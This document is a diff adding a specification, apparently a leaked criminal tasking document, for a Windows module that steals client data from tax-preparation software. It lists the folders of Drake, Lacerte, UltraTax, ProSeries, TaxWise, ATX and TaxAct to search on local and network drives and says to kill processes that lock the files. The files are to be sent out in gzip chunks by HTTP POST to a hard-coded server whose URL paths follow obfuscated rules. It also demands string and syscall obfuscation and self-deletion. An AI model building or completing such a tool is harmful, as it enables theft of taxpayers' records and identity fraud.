@@ -1,0 +1,210 @@
+Sentence
+SIMPLE MODULE FOR DOWNLOADING FILES FROM A COMPUTER
+Technical Specifications
+The purpose of the program is to search and download data from the computer
+DESCRIPTION AND DESIGN
+The program should be designed as an .exe file that does not accept command line parameters.
+The program collects program files (names as specified in the Windows registry):
+- 2018 Lacerte Tax
+- ProSeries 2018
+- UltraTax CS 2018
+- TaxWise 2018 on C Drive
+- ATX 2018
+The program searches the following files and folders for exact path matches:
+- DRAKE18/DT
+- UT18DATA
+- 18tax/IData
+(clarification - all folders that end in Data)
+- 18Data
+- UTS18/database + UTS18/Users + UTS18/password.18
+- TaxAct 2018 Professional Edition/Client Data
+"Hierarchy matching is important here - i.e. you don't just need a DT folder, but a DT folder inside the DRAKE18 folder."
+The search is case-insensitive.
+The number 18 in the folder names is the year number (2018) - it should be varied from 16 to 18.
+The search strategy is as follows:
+"1. Search on the desktop and in the user's working folders (Documents, Downloads) for shortcuts to the following programs:"
+- DRAKE18.EXE
+- DSTART.EXE
+- utw18.exe
+- w18tax.exe
+- protax18.exe
+- TWW17.exe
+- TaxAct18.exe
+- Sfs.ServerHost.exe
+- ATX.exe
+"(17, 18 are year numbers, varying the years from 16 to 18)."
+"If there are no shortcuts, most likely the necessary data are not present on the computer, because the corresponding programs are not installed."
+Finish the work.
+2.
+"Starting from the C: drive, look for the beginning of the hierarchies we need on the disk in the first level folders,"
+starting with the following folders:
+C:\ProWin18\18data
+C:\ProNet18\18data
+C:\Lacerte\18tax\******Data
+C:\WinCSI/UT18DATA.
+C:\DRAKE18\DT
+C:\ProgramData\Wolters Kluwer\ATX 2018 Server
+C:\UTS18
+C:\2018 Lacerte Tax.
+C:\ProSeries 2018
+C:\UltraTax CS 2018
+C:\TaxWise 2017
+"Next, we bypass all first-level folders on the current disk."
+Important: we do not stop the search after finding the first result.
+"3. Search on every disk, including network disks."
+4.
+We do NOT do a full recursive search!
+"The search is limited to the second level of directories - if there is no sign of the desired hierarchy on the second level,"
+we skip the folder.
+5.
+"If, when trying to open a file for reading, we get the File is busy error or similar (indicating that the file is blocked by another process), we search for the file."
+"file by another process), search for the process from point 1 in memory and kill it."
+"If the error persists, memorize the path to the folder and continue the search."
+"After the scan of all disks is complete, cycle through all non-transmitted folders,"
+going to sleep for a timeout of 10 minutes after each failed attempt - and so on ad infinitum.
+6.
+We send files using the file sending protocol.
+7. Read the PROMPT environment variable.
+"This variable will contain not the usual DOS/Windows command line prompt,"
+but the program identification data.
+"We parse the string by the separator , (comma) into three parts:"
+- Client ID
+- Group ID
+- IP address
+"If the string is not parsed (more or less fields), or the address is not similar to the address, take the values of these fields as:"
+Client ID: %MACHINE%-%USER%_W%winver%.%hex32% (generated according to the scheme below)
+Group ID: nop000
+IP address: 0.0.0.0.0
+Client Id is a string consisting of two dot-separated components.
+"The first part has the format %MACHINE%-%USER%_XYYYYYYYYY, where"
+MACHINE - computer name
+USER - user name
+X - symbol denoting the type of system the client is running on.
+"(W - windows, L - linux, A - android, M - Mac OS),"
+"YYYYYYYYYY - 3-7 digits containing major-version, minor-version and build of the operating system, if there are any such systems"
+"(for example, for 6.1 build 7600 it will be 617600)."
+"The second part contains 32 random characters 0-9, A-F."
+An example of a client id is HOSTNAME-USER_W617600.11223344556677889900AABBCCDDEEFF.
+The parameter is not case sensitive.
+8.
+"When transmitting data over the network (HTTP protocol), all HTTP codes that do not start with 200 are an error."
+"If there is a transmission problem (non-200 code or no response), retry ten times with a timeout of one hour and die."
+9.
+The server address is written in the program.
+The program should be able to work both by HTTP and HTTPS - for this purpose you can use WinInet/WinHTTP functions.
+10.
+The program must delete itself from the disk after completion.
+MODULE DESIGN
+1.
+"If a Microsoft compiler is selected, there must be a Microsoft Visual Studio project of version 2015 or higher."
+2.
+The Visual Studio project must be configured as follows:
+* For ALL build profiles:
+- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\.
+- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\.
+- Multiprocessor Compilation:
+Yes
+* Release Profile:
+- Debugging Information Format (C/C++ code creation):
+no
+- Create debugging information (linker/debugging):
+no
+"3. Obfuscate strings with Andrivet library (attached, see _"
+STR() macro)
+4. Obfuscate system calls with GetApi.h library.
+"Be careful, obfuscation of syscalls may cause crashes."
+5.
+The module must have two versions - x32- and x64-bit.
+6.
+"In the combat build, lines should be obfuscated to the maximum and all debugging output should be disabled."
+7.
+The module must have a debug version.
+Debug output should be output in modulename.log (the path to the log is configurable in the macro).
+Each log entry must contain a timestamp accurate to the second.
+8.
+"The project must have a config.h file (the name is not important, the essence is important - this is where all global settings - paths, macros-switches for conditional compilation, etc.)."
+9.
+The module should work on all modern versions of Windows.
+The minimum supported version of Windows is Windows XP (if it is impossible - Windows Vista).
+10.
+"Additionally, the file notelemetry.obj (https://stackoverflow.com/questions/37761768/how-to-prevent-visual-studio-2015-update-2-to-add-telemetry-main-invoke-trigger) must be added to the layout."
+FILE TRANSFER PROTOCOL
+1) basic information about the computer is sent to the server via HTTP POST in the multipart/form-data container (similar to sending an html form).
+The POST contains the following fields:
+timestamp - local UNIX time
+ip - IP address field
+ip1 - address of the first network interface (in this implementation fields with local interface addresses are not used; reserved)
+ip2 - address of the second network interface
+...
+ipN - address of the N-th network interface
+cid - Client ID field
+group - Group ID field
+hostname - hostname obtained via GetComputerName()
+source - `tax' string
+Sending is done to a url of the form:
+http://foo.com/<junk>/<auth>/<junk>
+"junk - arbitrary characters allowed in the URI, except slash /"
+auth - authorization section.
+"It is assumed that the one who sends the request,"
+should know the rules for forming this section.
+It is a random of any length.
+It must contain:
+- letter Z in any position
+- the sum of digits (not numbers!)
+from the 6th to the 15th position must be 31.
+The characters between them are random.
+"In particular, Z can be there."
+Example section - abcde7ol7k9hi8mZ
+"2) Then each file is sent in parts, by HTTP POST request, in multipart/form-data container."
+The file is sent in the file field.
+The file name is taken from the Content-Disposition tag; the temporary file name from the URI is ignored.
+In this case:
+- the file sending starts at the end.
+"For example, if the file is 100M long, we send the last 10M of the file."
+"- after sending a chunk of file and receiving an acknowledgement, the program remembers the state, and sends the next chunk."
+"- Before sending, the sent piece of file is read into memory and compressed with gzip algorithm."
+- sending is done to a URL of the form
+http://foo.com/<junk>/<auth>/<cid>/<filename>/<start>/<end>/<eof>
+where
+"junk - arbitrary characters allowed in the URI, except for the slash /"
+auth - authorization section.
+"This is a random of any length, in which the following is mandatory"
+- letter S in any position
+- the sum of digits (not numbers!)
+from the 8th to the 15th position must be 25.
+cid - Client ID field
+filename - name of the file in URL Encoded
+start - initial offset of the transmitted piece relative to the beginning of the file; both letters and numbers are allowed here.
+"But only digits are significant, in the order in which they appear in the string."
+"For example, 0A is number 0 (digit 0 is significant, letter A is ignored)."
+end - the final offset of the transmitted chunk relative to the beginning of the file; the rules are the same as for start.
+"For example, 3A5A2A3A9A5A9A9A is 3523959."
+eof is an indication of the end of the file.
+"If eof is present, this is the last piece of the file; and vice versa (the section is optional)"
+This is a random of any length in which the mandatory:
+- the first digit is even or 0
+- last letter A or F
+"When handling errors, an HTTP response code of 200 does not indicate a successful operation,"
+"but a non-200 code indicates a failed operation (e.g., 50* or 40* from a proxy)."
+"The exact operation code is contained within the XML in the body of the HTTP response, inside the <response> tag."
+"When a response code of the form 4041 is received, the appended character 1 is an internal server error code (enabled only during debugging)."
+"For example, the following response indicates an error code 9:"
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+"Date: Mon, 07 Oct 2019 13:08:44 GMT"
+Content-Type: application/xml; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept
+"<?xml version=""1.0"" encoding=""UTF-8""?"
+<response>4049</response>
+"Next response - no error, everything is ok"
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+"Date: Mon, 07 Oct 2019 13:08:44 GMT"
+Content-Type: application/xml; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept
+"<?xml version=""1.0"" encoding=""UTF-8""?"
+<response>200</response>
